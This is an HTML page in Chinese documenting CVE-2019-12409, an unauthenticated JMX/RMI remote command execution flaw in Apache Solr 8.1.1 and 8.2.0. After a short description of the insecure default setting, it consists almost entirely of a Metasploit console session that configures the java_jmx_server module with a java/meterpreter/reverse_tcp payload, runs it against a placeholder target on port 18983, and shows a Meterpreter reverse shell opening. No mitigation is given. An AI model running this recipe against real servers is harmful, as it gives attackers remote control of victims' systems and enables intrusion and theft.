<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
	<head>
		<meta http-equiv="Content-Type" content="text/html; charset=utf-8" /><title>
		</title>
		<style type="text/css">
			.csAD577193{text-align:left;text-indent:0pt;margin:24pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.csECDA2D3{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:16pt;font-weight:bold;font-style:normal;}
			.csDE05BCC{color:#4F81BD;background-color:transparent;font-family:Calibri;font-size:16pt;font-weight:bold;font-style:normal;}
			.cs868C439D{text-align:left;text-indent:0pt;margin:10pt 0pt 0pt 0pt;page-break-after:avoid;page-break-inside:avoid}
			.cs83F14626{color:#4F81BD;background-color:transparent;font-family:Microsoft YaHei UI;font-size:14pt;font-weight:bold;font-style:normal;}
			.cs40DD2BC9{text-align:left;text-indent:0pt;margin:9pt 0pt 9pt 0pt}
			.cs5BEC2C28{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:normal;}
			.cs8926E06{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:normal;font-style:normal;}
			.cs9C1B1871{color:#000000;background-color:transparent;font-family:Microsoft YaHei UI;font-size:12pt;font-weight:normal;font-style:normal;}
			.csC5F53424{color:#000000;background-color:transparent;font-family:Calibri;font-size:12pt;font-weight:bold;font-style:italic;}
			.cs9FB05234{color:#000000;background-color:transparent;font-family:Consolas;font-size:11pt;font-weight:normal;font-style:normal;}
			.cs3A447A38{text-align:left;text-indent:0pt;margin:0pt 0pt 10pt 0pt}
		</style>
	</head>
	<body>
		<h1 class="csAD577193">
			<a name="cve-2019-12409apache-solr-jmx-远程命令执行漏洞"><span class="csECDA2D3">（</span><span class="csDE05BCC">CVE-2019-12409</span><span class="csECDA2D3">）</span><span class="csDE05BCC">Apache Solr JMX </span><span class="csECDA2D3">远程命令执行漏洞</span></a></h1>
		<h2 class="cs868C439D">
			<a name="一漏洞简介"><span class="cs83F14626">一、漏洞简介</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs5BEC2C28">Linux</span><span class="cs8926E06"> </span><span class="cs9C1B1871">下的环境下的</span><span class="cs8926E06">Apache Solr 8.1.1</span><span class="cs9C1B1871">和</span><span class="cs8926E06">8.2.0</span><span class="cs9C1B1871">版本</span></p><p class="cs40DD2BC9"><span class="cs9C1B1871">存在默认不安全配置在</span><span class="csC5F53424">solr.sh</span><span class="cs9FB05234">ENABLE_REMOTE_JMX_OPTS=&quot;true&quot;</span><span class="cs8926E06">,</span><span class="cs9C1B1871">将导致启用</span><span class="cs8926E06">JMX</span><span class="cs9C1B1871">监视服务并将公网监听一个</span><span class="cs8926E06">18983</span><span class="cs9C1B1871">的</span><span class="cs8926E06">RMI</span><span class="cs9C1B1871">端口，且无需进行任何身份验证。</span></p><h2 class="cs868C439D">
			<a name="二漏洞影响"><span class="cs83F14626">二、漏洞影响</span></a></h2>
		<p class="cs40DD2BC9"><span class="cs8926E06">Apache Solr 8.1.1</span><span class="cs9C1B1871">和</span><span class="cs8926E06">8.2.0</span><span class="cs9C1B1871">版本</span></p><h2 class="cs868C439D">
			<a name="三复现过程"><span class="cs83F14626">三、复现过程</span></a></h2>
		<p class="cs3A447A38"><span class="cs9FB05234">msf5 &gt; use multi/misc/java_jmx_server</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf5 exploit(multi/misc/java_jmx_server) &gt; show options</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Module options (exploit/multi/misc/java_jmx_server):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;Name &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current Setting &nbsp;Required &nbsp;Description</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;---- &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--------------- &nbsp;-------- &nbsp;-----------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;JMXRMI &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmxrmi &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The name where the JMX RMI interface is bound</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;JMX_PASSWORD &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The password to interact with an authenticated JMX endpoint</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;JMX_ROLE &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The role to interact with an authenticated JMX endpoint</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;RHOSTS &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The target address range or CIDR identifier</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;RPORT &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The target port (TCP)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;SRVHOST &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;SRVPORT &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8080 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The local port to listen on.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;SSLCert &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Path to a custom SSL certificate (default is randomly generated)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;URIPATH &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The URI to use for this exploit (default is random)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">Exploit target:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;Id &nbsp;Name</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;-- &nbsp;----</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;0 &nbsp;&nbsp;Generic (Java Payload)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">msf5 exploit(multi/misc/java_jmx_server) &gt; set RHOSTS a.a.a.a</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">RHOSTS =&gt; a.a.a.a</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf5 exploit(multi/misc/java_jmx_server) &gt; set RPORT 18983</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">RPORT =&gt; 18983</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf5 exploit(multi/misc/java_jmx_server) &gt; set payload java/meterpreter/reverse_tcp</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">payload =&gt; java/meterpreter/reverse_tcp</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf5 exploit(multi/misc/java_jmx_server) &gt; show options</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">Module options (exploit/multi/misc/java_jmx_server):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;Name &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Current Setting &nbsp;Required &nbsp;Description</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;---- &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;--------------- &nbsp;-------- &nbsp;-----------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;JMXRMI &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;jmxrmi &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The name where the JMX RMI interface is bound</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;JMX_PASSWORD &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The password to interact with an authenticated JMX endpoint</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;JMX_ROLE &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The role to interact with an authenticated JMX endpoint</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;RHOSTS &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;a.a.a.a &nbsp;&nbsp;&nbsp;&nbsp;yes &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The target address range or CIDR identifier</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;RPORT &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;18983 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The target port (TCP)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;SRVHOST &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0.0.0.0 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The local host to listen on. This must be an address on the local machine or 0.0.0.0</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;SRVPORT &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;8080 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The local port to listen on.</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;SSLCert &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Path to a custom SSL certificate (default is randomly generated)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;URIPATH &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;no &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The URI to use for this exploit (default is random)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">Payload options (java/meterpreter/reverse_tcp):</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;Name &nbsp;&nbsp;Current Setting &nbsp;Required &nbsp;Description</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;---- &nbsp;&nbsp;--------------- &nbsp;-------- &nbsp;-----------</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;LHOST &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The listen address (an interface may be specified)</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;LPORT &nbsp;4444 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;yes &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;The listen port</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">Exploit target:</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;Id &nbsp;Name</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;-- &nbsp;----</span><span class="cs8926E06"><br/></span><span class="cs9FB05234"> &nbsp;&nbsp;0 &nbsp;&nbsp;Generic (Java Payload)</span><span class="cs8926E06"><br/><br/><br/></span><span class="cs9FB05234">msf5 exploit(multi/misc/java_jmx_server) &gt; set LHOST b.b.b.b</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">LHOST =&gt; b.b.b.b</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">msf5 exploit(multi/misc/java_jmx_server) &gt; run</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] Started reverse TCP handler on b.b.b.b:4444</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] a.a.a.a:18983 - Using URL: http://b.b.b.b:8080/OcbYS8uaTPDH</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] a.a.a.a:18983 - Sending RMI Header...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] a.a.a.a:18983 - Discovering the JMXRMI endpoint...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] a.a.a.a:18983 - JMXRMI endpoint on a.a.a.a:18983</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] a.a.a.a:18983 - Proceeding with handshake...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[+] a.a.a.a:18983 - Handshake with JMX MBean server on a.a.a.a:18983</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] a.a.a.a:18983 - Loading payload...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] a.a.a.a:18983 - Replied to request for mlet</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] a.a.a.a:18983 - Replied to request for payload JAR</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] a.a.a.a:18983 - Executing payload...</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] a.a.a.a:18983 - Replied to request for payload JAR</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] Sending stage (53867 bytes) to a.a.a.a</span><span class="cs8926E06"><br/></span><span class="cs9FB05234">[*] Meterpreter session 1 opened (a.a.a.a:4444 -&gt; b.b.b.b:46582) at 2019-11-21 15:24:53 +0000</span><span class="cs8926E06"><br/><br/></span><span class="cs9FB05234">meterpreter &gt;</span></p></body>
</html>
